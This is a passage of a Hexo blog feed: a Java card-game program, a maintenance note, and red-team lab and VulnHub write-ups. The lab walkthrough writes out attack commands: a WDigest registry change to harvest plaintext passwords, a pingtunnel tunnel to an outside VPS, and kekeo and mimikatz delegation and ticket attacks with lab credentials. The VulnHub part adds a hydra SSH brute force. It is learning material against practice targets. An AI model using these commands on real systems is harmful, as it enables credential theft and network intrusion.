&lt;p&gt;&lt;img src=&quot;https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206070141124.png&quot; alt=&quot;illust_67769848_20210308_195406&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="http://electq.github.io/categories/Java/"/>
    
    
    <category term="JavaSE" scheme="http://electq.github.io/tags/JavaSE/"/>
    
    <category term="编程" scheme="http://electq.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>博客运维记录</title>
    <link href="http://electq.github.io/2022/06/05/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4%E8%AE%B0%E5%BD%95/"/>
    <id>http://electq.github.io/2022/06/05/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4%E8%AE%B0%E5%BD%95/</id>
    <published>2022-06-04T16:08:10.000Z</published>
    <updated>2022-06-06T17:27:26.201Z</updated>
    
    <content type="html"><![CDATA[<p>网站是用<code>hexo+github</code>搭建的，记录一下平时运维的心得，不定时更新</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206050011983.jpg" alt="80582354_p0"></p><span id="more"></span><h3 id="2022-x2F-6-x2F-5"><a href="#2022-x2F-6-x2F-5" class="headerlink" title="2022&#x2F;6&#x2F;5"></a>2022&#x2F;6&#x2F;5</h3><p>在执行<code>hexo -d</code>报错</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206050012798.png" alt="image-20220605001229078"></p><p>这个报错真的是困扰许久，一度以为是主题的原因，实在可恶</p><p>网上给出的方案大概有</p><ul><li>换<code>ssh-key</code></li><li>删除<code>.deploy.git</code>文件夹再部署</li><li>网络原因(墙)</li></ul><p>自己解决的方案</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206050022960.png" alt="image-20220605002204929"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;网站是用&lt;code&gt;hexo+github&lt;/code&gt;搭建的，记录一下平时运维的心得，不定时更新&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206050011983.jpg&quot; alt=&quot;80582354_p0&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="运维" scheme="http://electq.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="hexo" scheme="http://electq.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>斗地主游戏</title>
    <link href="http://electq.github.io/2022/06/04/%E6%96%97%E5%9C%B0%E4%B8%BB%E6%B8%B8%E6%88%8F/"/>
    <id>http://electq.github.io/2022/06/04/%E6%96%97%E5%9C%B0%E4%B8%BB%E6%B8%B8%E6%88%8F/</id>
    <published>2022-06-04T13:43:49.000Z</published>
    <updated>2022-06-06T17:27:23.680Z</updated>
    
    <content type="html"><![CDATA[<p>关于<code>JavaSE</code>方面的学习，涉及到Collection体系常见的API和面向对象方法思路等</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206042145862.jpg" alt="wallhaven-y8622k"></p><span id="more"></span><h3 id="Card-java"><a href="#Card-java" class="headerlink" title="Card.java"></a>Card.java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.Game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Card</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String size;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line">    <span class="comment">//这里还要有一个来判断牌大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Card</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Card</span><span class="params">(String size, String color,<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.size = size;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">        <span class="built_in">this</span>.index =index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.index = index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSize</span><span class="params">(String size)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.size = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setColor</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> color +size ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Demo-java"><a href="#Demo-java" class="headerlink" title="Demo.java"></a>Demo.java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.Game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="comment">/*斗地主游戏步骤</span></span><br><span class="line"><span class="comment">    * 1.做牌</span></span><br><span class="line"><span class="comment">    * 2.洗牌</span></span><br><span class="line"><span class="comment">    * 3.定义三个玩家</span></span><br><span class="line"><span class="comment">    * 4.发牌</span></span><br><span class="line"><span class="comment">    * 5.排序</span></span><br><span class="line"><span class="comment">    * 6.看牌*/</span></span><br><span class="line">    <span class="comment">/*定义一个静态集合存储54张牌并且分类*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Card&gt; allCard = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  2.做牌作为静态代码块加载牌数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//3.定义点数，个数确定，类型确定，使用数组</span></span><br><span class="line">        String[] sizes =&#123;<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span>,<span class="string">&quot;J&quot;</span>,<span class="string">&quot;Q&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;2&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//4.定义花色，依然使用数组</span></span><br><span class="line">        String[] colors =&#123;<span class="string">&quot;♣&quot;</span>,<span class="string">&quot;♦&quot;</span>,<span class="string">&quot;♥&quot;</span>,<span class="string">&quot;♠&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//5.组合花色和点数,大小</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (String size : sizes) &#123;</span><br><span class="line">            index ++;</span><br><span class="line">            <span class="keyword">for</span> (String color : colors) &#123;</span><br><span class="line">                <span class="comment">//6.二者封装成一个对象</span></span><br><span class="line">                <span class="type">Card</span> <span class="variable">c</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Card</span>(size,color,index);</span><br><span class="line">                <span class="comment">//7.存储到集合对象中</span></span><br><span class="line">                allCard.add(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//8.大小王单独加入集合</span></span><br><span class="line">        <span class="type">Card</span> <span class="variable">C1</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Card</span>(<span class="string">&quot;🃏&quot;</span>,<span class="string">&quot;&quot;</span>,++index);</span><br><span class="line">        <span class="type">Card</span> <span class="variable">C2</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Card</span>(<span class="string">&quot;👲&quot;</span>,<span class="string">&quot;&quot;</span>,++index);</span><br><span class="line">        Collections.addAll(allCard,C1,C2);</span><br><span class="line">        <span class="comment">//System.out.println(&quot;新牌:&quot;+allCard);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">/*9.随机洗牌*/</span></span><br><span class="line">        Collections.shuffle(allCard);</span><br><span class="line">        System.out.println(<span class="string">&quot;洗牌后&quot;</span>+allCard);</span><br><span class="line">      <span class="comment">/*10.发牌，定义三个玩家,每个玩家相当于一个集合容器*/</span></span><br><span class="line">        List&lt;Card&gt; ZhangSan = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Card&gt; LiSi = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Card&gt; WangWu = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">      <span class="comment">/*11.开始发牌，每个人得到17张牌，剩下3张牌作为底牌*/</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; allCard.size()-<span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//获取当前对象</span></span><br><span class="line">            <span class="type">Card</span> <span class="variable">b</span> <span class="operator">=</span> allCard.get(i);</span><br><span class="line">            <span class="comment">//通过%3判断加入哪个玩家</span></span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                ZhangSan.add(b);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">3</span> ==<span class="number">1</span>)&#123;</span><br><span class="line">                LiSi.add(b);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">3</span> ==<span class="number">2</span>)&#123;</span><br><span class="line">                WangWu.add(b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*12.三张牌结合为子集合*/</span></span><br><span class="line">        List&lt;Card&gt; LastThreeCard = allCard.subList(allCard.size()-<span class="number">3</span>, allCard.size() );</span><br><span class="line">        <span class="comment">/*13.使用方法给玩家的牌排序*/</span></span><br><span class="line">        sortCard(ZhangSan);</span><br><span class="line">        sortCard(LiSi);</span><br><span class="line">        sortCard(WangWu);</span><br><span class="line">        sortCard(LastThreeCard);</span><br><span class="line">        <span class="comment">/*14.输出玩家的牌*/</span></span><br><span class="line">        System.out.println(<span class="string">&quot;这是张三的牌：&quot;</span>+ZhangSan);</span><br><span class="line">        System.out.println(<span class="string">&quot;这是李四的牌：&quot;</span>+LiSi);</span><br><span class="line">        System.out.println(<span class="string">&quot;这是王五的牌&quot;</span>+WangWu);</span><br><span class="line">        System.out.println(<span class="string">&quot;这是底牌&quot;</span>+LastThreeCard);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 给牌排序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sb</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sortCard</span><span class="params">(List&lt;Card&gt; sb)</span> &#123;</span><br><span class="line">        Collections.sort(sb, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Card&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Card o1, Card o2)</span> &#123;</span><br><span class="line">                <span class="comment">//必须要自己定义一个规则</span></span><br><span class="line">                <span class="keyword">return</span> o2.getIndex()- o1.getIndex();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="System-Out"><a href="#System-Out" class="headerlink" title="System-Out"></a>System-Out</h3><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206042153468.png" alt="image-20220604215321427"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于&lt;code&gt;JavaSE&lt;/code&gt;方面的学习，涉及到Collection体系常见的API和面向对象方法思路等&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206042145862.jpg&quot; alt=&quot;wallhaven-y8622k&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="http://electq.github.io/categories/Java/"/>
    
    
    <category term="JavaSE" scheme="http://electq.github.io/tags/JavaSE/"/>
    
    <category term="编程" scheme="http://electq.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>渗透红队靶场2.0</title>
    <link href="http://electq.github.io/2022/06/03/%E6%B8%97%E9%80%8F%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA2-0/"/>
    <id>http://electq.github.io/2022/06/03/%E6%B8%97%E9%80%8F%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA2-0/</id>
    <published>2022-06-03T03:28:47.000Z</published>
    <updated>2022-06-03T04:29:49.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/1636704314_618e203aed9c3a0ec73e7.png!small" alt="img"></p><span id="more"></span><h2 id="WEB-x2F-信息收集"><a href="#WEB-x2F-信息收集" class="headerlink" title="WEB&#x2F;信息收集"></a>WEB&#x2F;信息收集</h2><p>端口探测</p><p>nmap -v -Pn -T4 -sV -n -sT –open -p 22,1222,2222,22345,23,21,80,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,7002,389,902,1194,1080,88,69,2049,389,5632,8080,8089,9090,4848,1352,10000,27017,27018,25,110,143,67,68,161,2181,8069,9200,9300,11211,512,513,514,873,3690,50000 192.168.72.133  </p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220420220200519.png" alt="image-20220420220200519"></p><p>访问<a href="http://192.168.72.133:7001/console">http://192.168.72.133:7001/console</a></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220420220853360.png" alt="image-20220420220853360"></p><p>版本12.1.3.0.0推测存在Weblogic IIOP协议反序列化漏洞（CVE-2020-2551）</p><p>利用powershell执行命令上线CS</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220420230539681.png" alt="image-20220420230539681"></p><p>发现是双网卡</p><p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码,可以通过修改注册表强制锁屏让Wdigest Auth保存明文口令</p><p>修改注册表为1启用<br>shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>强制锁屏<br>shell “rundll32 user32.dll,LockWorkStation”</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220421201927330.png" alt="image-20220421201927330"></p><p>当管理员再次输入密码登录账户时，就能可以通过logonpasswords 获取明文密码</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220421202433832.png" alt="image-20220421202433832"></p><p>有了管理员用户就可以尝试RDP登录</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220421210703742.png" alt="image-20220421210703742"></p><p>查看防火墙规则看到了这条</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422000435191.png" alt="image-20220422000435191"></p><p>搭建pingtunnel服务器等待客户端连接</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422003419498.png" alt="image-20220422003419498"></p><p>将6666端口流量转发到kali的6666端口实现代理连接可以访问内部网段</p><p>socks 6666</p><p>shell pingtunnel.exe -type client -l :6666 -s 117.50.179.15 -sock5 1 -nolog 1</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422125206067.png" alt="image-20220422125206067"></p><p>这里windows的远程桌面连接报个了数据加密的错，需要修改一下本地策略</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422125320431.png" alt="image-20220422125320431"></p><p>windows proxifier代理工具远程连接主机</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422125038628.png" alt="image-20220422125038628"></p><p>将会话传递给msf</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220430221005057.png" alt="image-20220430221005057"></p><p>收集网络信息并且添加路由</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424084357311.png" alt="image-20220424084357311"></p><p>上传fscan64.exe扫描内网网段发现win7存在永恒之蓝漏洞</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220430220818025.png" alt="image-20220430220818025"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424090857613.png" alt="image-20220424090857613"></p><p>永恒之蓝直接getsystem</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424094328523.png" alt="image-20220424094328523"></p><p>load mimikatz抓取域用户密码</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424111520068.png" alt="image-20220424111520068"></p><p>开启RDP远程连接</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424180451388.png" alt="image-20220424180451388"></p><p>查询ip信息</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424161219708.png" alt="image-20220424161219708"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424165417056.png" alt="image-20220424165417056"></p><p>获取更多的凭证</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424170550584.png" alt="image-20220424170550584"></p><p>管理员才有权限能远程登录</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424180837972.png" alt="image-20220424180837972"></p><p>容量小的软件就可以直接用upload上传</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424181229399.png" alt="image-20220424181229399"></p><h2 id="bind-tcp打win7不出网"><a href="#bind-tcp打win7不出网" class="headerlink" title="bind_tcp打win7不出网"></a>bind_tcp打win7不出网</h2><p>靶机主动连接跳板机需要修改防火墙的入站规则,如果不修改防火墙策略的话，针对对方主机不出网的特点，我们就可以采用bind连接方式，上传一个被动连接的木马(前提是你已经有一个msf会话)到win7上再用跳板机的会话去连接它</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501104312926.png" alt="image-20220501104312926"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501104238704.png" alt="image-20220501104238704"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501232405342.png" alt="image-20220501232405342"></p><p>当前是普通用户权限</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501232158302.png" alt="image-20220501232158302"></p><p>查看系统信息</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501232044317.png" alt="image-20220501232044317"></p><p>MS14-068域提权的补丁编号KB3011780这里没有，可以尝试打一下,但是一直没回显(不知道是对方主机不出网的原因还是插件的原因)</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502000855766.png" alt="image-20220502000855766"></p><p>查看域控信息,因为CS那边提权老是不成功所以win7的后渗透信息收集还是交给msf来做</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502210148422.png" alt="image-20220502210148422"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502210834276.png" alt="image-20220502210834276"></p><p>被禁止获取域控的信息,只知道域名是REDTEAM,域内就三台主机排除也是很快的</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502211150249.png" alt="image-20220502211150249"></p><p>还是上传fscan64.exe对内网段进行扫描，发现这里10.10.10.18主机存在mysql弱口令</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502212817923.png" alt="image-20220502212817923"></p><p>上传AdFind用于寻找域内委派用户,没想到也可以直接找到域控信息</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502213610535.png" alt="image-20220502213610535"></p><p>查询域中配置非约束委派的服务账户</p><p><code>AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p><p>可以得知sqlserver服务器上存在一个委派用户</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502214817911.png" alt="image-20220502214817911"></p><h2 id="代理隧道访问mssql"><a href="#代理隧道访问mssql" class="headerlink" title="代理隧道访问mssql"></a>代理隧道访问mssql</h2><p>本地9999端口启用sock代理</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503095014907.png" alt="image-20220503095014907"></p><p>将10.10.20.7的9999端口sockd代理转发到web主机的1090端口</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503100010062.png" alt="image-20220503100010062"></p><p>因为使用lcx_tran不成功这里换成msf来做端口转发,CS命令不会就是这样了</p><p>(10.10.20.7:9999&lt;–&gt;10.10.20.12:1090)</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101342609.png" alt="image-20220503101342609"></p><p>同理使用pingtunnel将socks5端口转发至VPS</p><p>(VPS:1090 &lt;—&gt; 192.168.72.133:1090)</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101412703.png" alt="image-20220503101412703"></p><p>使用代理远程连接mssql数据库(Proxifier是个好东西)</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101633367.png" alt="image-20220503101633367"></p><p>查看权限只是个服务权限</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101855226.png" alt="image-20220503101855226"></p><p>使用SharpSQLTools进行提权（但是这个权限没有转移到msf和cs上去,不懂）</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503104507380.png" alt="image-20220503104507380"></p><p>由于cs的win7beacon上不回显，先使用msf先拿到一个低权限用户</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503111019797.png" alt="image-20220503111019797"></p><p>烂土豆（MS16-075）令牌窃取</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503115024286.png" alt="image-20220503115024286"></p><p>上传木马上线CS</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503112012028.png" alt="image-20220503112012028"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503120156852.png" alt="image-20220503120156852"></p><h2 id="委派约束攻击"><a href="#委派约束攻击" class="headerlink" title="委派约束攻击"></a>委派约束攻击</h2><p>利用kekeo请求该用户的TGT</p><p><code>kekeo.exe &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot;</code></p><p>然后使用这张TGT拿到域控的ST</p><p><code>kekeo.exe &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</code></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503205305391.png" alt="image-20220503205305391"></p><p>将票据载入内存</p><p><code>mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</code></p><p>这里CS不回显让我以为失败了(恼！！)</p><p>然后我们就拥有域控的权限</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503214905876.png" alt="image-20220503214905876"></p><p>flag在域控桌面上</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503215241118.png" alt="image-20220503215241118"></p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>1.体积较大的文件还是用RDP传输不然msf的session容易die</p><p>2.msf的永恒之蓝exp只能打一次上线后最好及时留个后门</p><p>3.防火墙规则对出站进行限制的话可以采用正向连接的方式</p><p>4.代理中cs自带的sock4a代理和ew的sock5是不兼容的，版本不同是不能通信的</p><p>由于本人刚刚学习内网这块，还是有很多细节问题不能有效解决，希望能在未来深入学习中得到解答</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;靶场环境&quot;&gt;&lt;a href=&quot;#靶场环境&quot; class=&quot;headerlink&quot; title=&quot;靶场环境&quot;&gt;&lt;/a&gt;靶场环境&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/1636704314_618e203aed9c3a0ec73e7.png!small&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透学习" scheme="http://electq.github.io/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="靶场" scheme="http://electq.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="红队" scheme="http://electq.github.io/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-zeus</title>
    <link href="http://electq.github.io/2022/06/03/vulnhub-zeus/"/>
    <id>http://electq.github.io/2022/06/03/vulnhub-zeus/</id>
    <published>2022-06-02T23:28:47.000Z</published>
    <updated>2022-06-06T17:27:30.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这台靶机就是静态ip，我把kali的网卡绑定成和他一样才能联通</p><span id="more"></span><h2 id="探测-信息收集"><a href="#探测-信息收集" class="headerlink" title="探测-信息收集"></a>探测-信息收集</h2><p>端口扫描</p><p>访问80端口，主页面没有什么可以利用的信息</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231223424.png" alt="image-20220416231223424"></p><p>网站目录扫描</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416225957484.png" alt="image-20220416225957484"></p><p><a href="http://192.168.131.170/assets/">http://192.168.131.170/assets/</a> 一些网站的前端配置文件，没有什么有效的信息</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416230026418.png" alt="image-20220416230026418"></p><p><a href="http://192.168.131.170/backups/">http://192.168.131.170/backups/</a> 备份目录没有啥</p><p><a href="http://192.168.131.170/telecom/">http://192.168.131.170/telecom/</a> 源码里藏着信息</p><blockquote><p>the website will be updated by gogu</p></blockquote><p>其实到这里我一直在怀疑为啥ftp端口没啥信息呢</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416230735002.png" alt="image-20220416230735002"></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231105312.png" alt="image-20220416231105312"></p><p>最终只能去爆破密码了，跑到吐血</p><p>hydra -l gogu -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.131.170 ssh</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231206190.png" alt="image-20220416231206190"></p><blockquote><p>得到密码 universal </p></blockquote><h2 id="提权-越狱"><a href="#提权-越狱" class="headerlink" title="提权-越狱"></a>提权-越狱</h2><p>ssh <a 